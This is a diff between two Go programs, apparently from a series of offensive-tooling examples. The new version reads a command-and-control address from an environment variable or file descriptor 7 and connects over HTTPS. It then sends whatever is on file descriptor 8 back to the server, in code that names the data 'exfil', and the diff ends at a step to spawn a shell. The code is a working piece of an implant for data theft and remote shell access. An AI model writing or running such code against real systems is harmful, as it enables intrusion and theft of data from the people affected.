@@ -1,0 +1,72 @@
+--- ../comms_without_dns/comms_without_dns.go	Sat Sep  7 18:45:54 2024
++++ read_from_file_descriptor.go	Sat Sep  7 18:45:54 2024
+@@ -1,12 +1,13 @@
+-// Program comms_without_dns - coms_over_https but without a DNS lookup
++// Program read_from_file_descriptor - comms_without_dns but reads from a file
++// descriptor
+ package main
+ 
+ /*
+- * comms_without_dns.go
+- * comms_over_https but without a DNS lookup
++ * read_from_file_descriptor.go
++ * comms_without_dns but reads from a file descriptor
+  * By J. Stuart McMurray
+- * Created 20240905
+- * Last Modified 20240906
++ * Created 20240907
++ * Last Modified 20240907
+  */
+ 
+ import (
+@@ -27,24 +28,24 @@
+ var (
+ 	Address           = "https://localhost:4444/shell"
+ 	AddressEnvVar     = "ALPT4ATS_ADDRESS"
+-	File              = "/etc/hosts"
+-	FileEnvVar        = "ALPT4ATS_FILE"
+ 	RealAddressEnvVar = "ALPT4ATS_REAL_ADDRESS"
+ )
+ 
+-// ConfFD is the file descriptor from which we might read our config.
+-const ConfFD = 7
++const (
++	// ConfFD is the file descriptor from which we might read our config.
++	ConfFD = 7
++	// FileFD is the file descriptor for a file to send back to the server.
++	FileFD = 8
++)
+ 
+ func main() {
+ 	/* Config from environment overrides compile-time config. */
+ 	Address = cmp.Or(os.Getenv(AddressEnvVar), Address)
+-	File = cmp.Or(os.Getenv(FileEnvVar), File)
+ 
+ 	/* Config from file descriptor 7 overrides config from environment. */
+ 	if _, err := fmt.Fscan(
+ 		os.NewFile(uintptr(ConfFD), "config"),
+ 		&Address,
+-		&File,
+ 	); nil != err && !errors.Is(err, io.EOF) &&
+ 		!errors.Is(err, syscall.EBADF) {
+ 		log.Fatalf("Error reading config from FD %d: %s", ConfFD, err)
+@@ -68,13 +69,12 @@
+ 		log.Fatalf("HTTPS request error: %s", err)
+ 	}
+ 
+-	/* Send back the file. */
+-	b, err := os.ReadFile(File)
+-	if nil != err {
+-		log.Fatalf("Error reading file: %s", err)
+-	}
+-	if _, err := pw.Write(b); nil != err {
+-		log.Printf("Error sending file: %s", err)
++	/* Send back whatever's on the File FD. */
++	if _, err := io.Copy(
++		pw,
++		os.NewFile(uintptr(FileFD), "exfil"),
++	); nil != err {
++		log.Printf("Error exfilling from FD %d: %s", FileFD, err)
+ 	}
+ 
+ 	/* Spawn a shell. */
